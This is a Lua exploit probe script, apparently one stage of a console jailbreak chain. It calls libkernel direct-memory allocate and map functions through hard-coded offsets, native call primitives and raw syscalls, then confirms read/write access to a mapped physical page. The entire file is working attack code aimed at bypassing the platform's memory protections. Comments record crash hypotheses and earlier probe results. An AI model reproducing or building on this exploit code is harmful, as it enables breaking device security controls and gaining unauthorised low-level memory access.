-- CRASH_CLASS: LOW
-- PROBE 544k: MapDirectMemory — read results with native.read_buffer
--
-- 544g confirms: rv=0 prints correctly after MapDM.
-- Corruption starts when Lua tries to read memory AFTER MapDM.
-- Hypothesis: memory.read_qword triggers native handler re-entry
-- which crashes because MapDM changed process memory map.
--
-- Strategy:
-- 1. AllocDM (works)
-- 2. MapDM (rv=0 confirmed)
-- 3. Read virt_out using native.read_buffer (single native call,
--    reads raw bytes without re-entering chain execution)
-- 4. Parse the bytes in pure Lua
-- 5. Use native.read_buffer to read the mapped page too

print("=== PROBE 544k: MapDM NATIVEREAD ===")
io.stdout:setvbuf("no")

local function to_num(v)
    if type(v) == "table" and v.tonumber then return v:tonumber() end
    return tonumber(v) or 0
end
local function q(v)
    if type(v) == "table" and v.h then
        local h, l = v.h, v.l
        if h < 0 then h = h + 0x100000000 end
        if l < 0 then l = l + 0x100000000 end
        return string.format("0x%08X%08X", h, l)
    end
    return string.format("0x%X", to_num(v))
end
local function wq(a, v) return pcall(function() memory.write_qword(a, v) end) end
local function wd(a, v) return pcall(function() memory.write_dword(a, v) end) end
local function rd(a)
    local ok, v = pcall(function() return memory.read_dword(a) end)
    if ok then return to_num(v) end; return nil
end
local function rq(a)
    local ok, v = pcall(function() return memory.read_qword(a) end)
    if ok then return v end; return nil
end
local function make_syscall(num)
    local t = {}
    for k, v in pairs(syscall.pipe) do t[k] = v end
    t.syscall_no = num
    setmetatable(t, getmetatable(syscall.pipe))
    return t
end

-- Helper: read N bytes via native.read_buffer and return as hex string
local function read_hex(addr, len)
    local ok, data = pcall(function()
        return native.read_buffer(addr, len)
    end)
    if not ok or not data then return nil end
    local hex = ""
    for i = 1, #data do
        hex = hex .. string.format("%02X", string.byte(data, i))
    end
    return hex, data
end

-- Helper: parse LE uint64 from 8 raw bytes
local function parse_u64(data, offset)
    offset = offset or 1
    local b = {}
    for i = 0, 7 do
        b[i] = string.byte(data, offset + i)
    end
    local lo = b[0] + b[1]*0x100 + b[2]*0x10000 + b[3]*0x1000000
    local hi = b[4] + b[5]*0x100 + b[6]*0x10000 + b[7]*0x1000000
    return hi, lo
end

-- Helper: parse LE uint32 from 4 raw bytes
local function parse_u32(data, offset)
    offset = offset or 1
    local b = {}
    for i = 0, 3 do
        b[i] = string.byte(data, offset + i)
    end
    return b[0] + b[1]*0x100 + b[2]*0x10000 + b[3]*0x1000000
end

if not libkernel_base then print("FATAL"); return end
local pid = to_num(syscall.getpid())
print("pid=" .. pid)

local map_fn = libkernel_base + uint64(0x15020)
local alloc_fn = libkernel_base + uint64(0x17EF0)

-- [A] AllocDM
print("[A] AllocDM")
local phys_out = memory.alloc(8)
wq(phys_out, uint64(0))
local ok_a, arv = pcall(function()
    return native.fcall_with_rax(alloc_fn, 0,
        uint64(0), uint64("0x150000000"), uint64(0x4000),
        uint64(0x4000), uint64(0), uint64(phys_out))
end)
local phys = rq(phys_out)
print("  rv=" .. (ok_a and to_num(arv) or "FAIL") .. " phys=" .. q(phys))
if not ok_a or to_num(arv) ~= 0 then print("FATAL"); return end

-- [B] Prepare virt_out on isolated mmap page
print("[B] Prepare")
local sc_mmap = make_syscall(477)
local iso = sc_mmap(uint64(0), uint64(0x4000), uint64(3),
    uint64(0x1002), uint64(0xFFFFFFFF), uint64(0))
print("  iso_page=" .. q(iso))
local virt_out = iso + uint64(0x100)  -- small offset
wq(virt_out, uint64(0))
print("  virt_out=" .. q(virt_out))

-- [C] MapDM
print("[C] MapDM")
local ok_m, mrv = pcall(function()
    return native.fcall_with_rax(map_fn, 0,
        uint64(virt_out), uint64(0x4000), uint64(3),
        uint64(0), phys, uint64(0x4000))
end)

-- rv prints correctly (confirmed in 544g)
if ok_m then
    local rv_n = to_num(mrv)
    print("  rv=" .. rv_n)

    if rv_n == 0 then
        print("  *** MapDM SUCCESS ***")

        -- [D] Read virt_out via native.read_buffer (NOT memory.read_qword)
        print("[D] Read virt_out")
        local hex8, raw8 = read_hex(virt_out, 8)
        if hex8 then
            print("  hex=" .. hex8)
            local hi, lo = parse_u64(raw8)
            print(string.format("  virt=0x%08X%08X", hi, lo))

            if hi ~= 0 or lo ~= 0 then
                local virt = uint64(string.format("0x%X%08X", hi, lo))

                -- [E] Write pattern to mapped page via memory.write_dword
                print("[E] Write test")
                local ok_w = wd(virt, 0xDEADBEEF)
                print("  write ok=" .. tostring(ok_w))

                -- [F] Read back via native.read_buffer
                print("[F] Read test")
                local hex4, raw4 = read_hex(virt, 4)
                if hex4 then
                    print("  hex=" .. hex4)
                    local val = parse_u32(raw4)
                    print(string.format("  read=0x%08X", val))
                    if val == 0xDEADBEEF then
                        print("  *** PHYSICAL MEMORY R/W CONFIRMED ***")
                        print("  *** WE HAVE DIRECT PHYSICAL MEMORY ACCESS ***")
                    end
                else
                    print("  read_buffer FAIL on mapped page")
                end

                -- [G] Dump first 32 bytes of mapped page
                print("[G] Page dump")
                local hex32, _ = read_hex(virt, 32)
                if hex32 then print("  " .. hex32) end
            else
                print("  virt_out = 0 (MapDM didn't write address)")
            end
        else
            print("  native.read_buffer FAIL")

            -- Fallback: try memory.read_dword
            print("  fallback: rd")
            local lo2 = rd(to_num(virt_out))
            local hi2 = rd(to_num(virt_out) + 4)
            if lo2 and hi2 then
                if lo2 < 0 then lo2 = lo2 + 0x100000000 end
                if hi2 < 0 then hi2 = hi2 + 0x100000000 end
                print(string.format("  virt=%08X%08X", hi2, lo2))
            end
        end
    else
        if rv_n < 0 then rv_n = rv_n + 0x100000000 end
        print(string.format("  error=0x%X", rv_n))
    end
else
    print("  CRASH: " .. tostring(mrv))
end

print("C=" .. tostring(pcall(function() return syscall.getpid() end)))
print("=== DONE ===")
